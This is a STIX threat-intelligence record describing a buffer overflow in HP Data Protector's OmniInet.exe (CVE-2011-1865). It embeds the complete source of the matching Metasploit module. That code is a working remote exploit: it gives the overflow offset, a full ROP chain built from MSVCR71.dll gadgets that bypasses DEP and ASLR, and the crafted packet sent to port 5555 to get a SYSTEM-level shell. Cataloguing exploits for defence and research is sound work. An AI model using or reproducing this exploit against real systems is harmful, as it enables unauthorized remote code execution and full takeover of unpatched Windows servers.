{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3953d176-b902-4e2b-b225-01c63e72b981",
    "created": "2024-08-14T16:46:42.368143Z",
    "modified": "2024-08-14T16:46:42.368147Z",
    "name": "\"HP OmniInet.exe Opcode 20 Buffer Overflow\"",
    "description": " This module exploits a vulnerability found in HP Data Protector's OmniInet process.  By supplying a long string of data as the file path with opcode '20' a buffer overflow can occur when this data is being written on the stack where no proper bounds checking is done beforehand, which results arbitrary code execution under the context of SYSTEM.  This module is also made against systems such as Windows Server 2003 or Windows Server 2008 that have DEP and/or ASLR enabled by default.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/hp_omniinet_4.rb",
            "external_id": "hp_omniinet_4.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-1865"
        },
        {
            "source_name": "reference",
            "url": "http://www.coresecurity.com/content/HP-Data-Protector-multiple-vulnerabilities"
        },
        {
            "source_name": "reference",
            "url": "http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02872182"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"HP OmniInet.exe Opcode 20 Buffer Overflow\",\n      'Description'    => %q{\n          This module exploits a vulnerability found in HP Data Protector's OmniInet\n        process.  By supplying a long string of data as the file path with opcode '20',\n        a buffer overflow can occur when this data is being written on the stack where\n        no proper bounds checking is done beforehand, which results arbitrary code\n        execution under the context of SYSTEM.  This module is also made against systems\n        such as Windows Server 2003 or Windows Server 2008 that have DEP and/or ASLR\n        enabled by default.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Oren Isacson',  #Initial discovery, poc\n          'muts',          #Initial poc of the ROP exploit w/ dookie (WPM())\n          'dookie',        #Initial poc of the ROP exploit w/ muts (WPM())\n          'sinn3r',        #MSF module with corelanc0d3r  (Also Thx to MC and HD)\n          'corelanc0d3r <peter.ve[at]corelan.be>',  #MSF module with sinn3r, VP() ROP Chain\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2011-1865' ],\n          [ 'OSVDB', '73571'],\n          [ 'EDB', '17468' ],\n          [ 'URL', 'http://www.coresecurity.com/content/HP-Data-Protector-multiple-vulnerabilities' ],\n          [ 'URL', 'http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02872182' ],\n        ],\n      'Payload'        =>\n        {\n          'BadChars'        => \"\\x00\",\n          'PrependEncoder'  => \"\\x66\\x81\\xc4\\xb8\\x0b\\x61\\x9d\", #add sp, 0xb88; popad; popfd\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => \"process\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          #If 'Max' gets too long (ie. 10000 bytes), we can get a busted heap\n          [\n            'HP Data Protector A.06.10 b611 / A.06.11 b243 XP SP3/Win2003/Win2008',\n            {\n              'Offset' => 1993,       #For overwriting a RETN (6481 for SEH)\n              'Ret'    => 0x7C342629, #RETN - MSVCR71.dll\n              'Max'    => 5000,\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2011-06-29',\n      'DefaultTarget'  => 0))\n\n      register_options([Opt::RPORT(5555)])\n  end\n\n  def nop\n    return make_nops(4).unpack(\"L\")[0].to_i\n  end\n\n  def exploit\n\n    connect\n\n    #mona.py tekniq\n    #https://www.corelan.be/index.php/2011/07/03/universal-depaslr-bypass-with-msvcr71-dll-and-mona-py/\n    rop = [\n      #Initial setup - ROP Flight Landing Strip\n      0x7C342629,  # SLIDE\n      0x7C342629,  # SLIDE\n      0x7C342629,  # SLIDE\n      0x7C342629,  # SLIDE\n      #ROP begins here\n      0x7c346c0a,  # POP EAX # RETN (MSVCR71.dll)\n      0x7c37a140,  # Make EAX readable\n      0x7c37591f,  # PUSH ESP # ... # POP ECX # POP EBP # RETN (MSVCR71.dll)\n      nop,         # EBP\n      0x7c346c0a,  # POP EAX # RETN (MSVCR71.dll)\n      0x7c37a140,  # <- VirtualProtect() found in IAT\n      0x7c3530ea,  # MOV EAX,DWORD PTR DS:[EAX] # RETN (MSVCR71.dll)\n      0x7c346c0b,  # Slide, so next gadget would write to correct stack location\n      0x7c376069,  # MOV [ECX+1C],EAX # P EDI # P ESI # P EBX # RETN (MSVCR71.dll)\n      nop,         # EDI (filler)\n      nop,         # will be patched at runtime (VP), then picked up into ESI\n      nop,         # EBX (filler)\n      0x7c376402,  # POP EBP # RETN (msvcr71.dll)\n      0x7c345c30,  # ptr to push esp #  ret  (from MSVCR71.dll)\n      0x7c346c0a,  # POP EAX # RETN (MSVCR71.dll)\n      0xfffff82f,  # size 20001 bytes\n      0x7c351e05,  # NEG EAX # RETN (MSVCR71.dll)\n      0x7c354901,  # POP EBX # RETN (MSVCR71.dll)\n      0xffffffff,  # pop value into ebx\n      0x7c345255,  # INC EBX # FPATAN # RETN (MSVCR71.dll)\n      0x7c352174,  # ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN (MSVCR71.dll)\n      0x7c34d201,  # POP ECX # RETN (MSVCR71.dll)\n      0x7c38b001,  # RW pointer (lpOldProtect) (-> ecx)\n      0x7c34b8d7,  # POP EDI # RETN (MSVCR71.dll)\n      0x7c34b8d8,  # ROP NOP (-> edi)\n      0x7c344f87,  # POP EDX # RETN (MSVCR71.dll)\n      0xffffffc0,  # value to negate, target value : 0x00000040, target: edx\n      0x7c351eb1,  # NEG EDX # RETN (MSVCR71.dll)\n      0x7c346c0a,  # POP EAX # RETN (MSVCR71.dll)\n      0x90909090,  # NOPS (-> eax)\n      0x7c378c81,  # PUSHAD # ADD AL,0EF # RETN (MSVCR71.dll)\n    ].pack('V*')\n\n    #Overflowing path \"C:\\Program Files\\OmniBack\\bin\\\"\n    #4807 bytes after target.ret, but we need to use less than that to avoid a busted heap\n    sploit = ''\n    sploit << rand_text_alpha(target['Offset']-sploit.length)\n    sploit << [target.ret].pack('V*')\n    sploit << rop\n    sploit << payload.encoded\n    sploit << rand_text_alpha(target['Max']-sploit.length)\n\n    pkt  = ''\n    pkt << Rex::Text.to_unicode(\"\\x00\")\n    pkt << \"\\x41\\x41\"  #Length field place holder\n    pkt << \"\\xff\\xfe\"\n    pkt << Rex::Text.to_unicode(\"\\x32\\x00\")\n    pkt << (Rex::Text.to_unicode(\"\\x20\\x61\\x00\") * 5)\n    pkt << Rex::Text.to_unicode(\"\\x20\")\n    pkt << Rex::Text.to_unicode(\"20\")  #Opcode\n    pkt << \"\\x00\"\n    pkt << (Rex::Text.to_unicode(\"\\x20\\x61\\x00\") * 7)\n    pkt << Rex::Text.to_unicode(\"\\x20\\x00\")\n    pkt << sploit\n    pkt << Rex::Text.to_unicode(\"\\x00\")\n    pkt << (Rex::Text.to_unicode(\"\\x20\\x61\\x00\") * 16)\n\n    #pkt length\n    pkt[2,2] = [pkt.length-5].pack('n')\n\n    print_status(\"Sending packet to #{datastore['RHOST']}...\")\n    sock.put(pkt)\n\n    #Data Protector lags before triggering the vuln code\n    #Long delay seems necessary to ensure we get a shell back\n    select(nil,nil,nil,20)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-06-29",
    "x_mitre_platforms": [
        "win'"
    ]
}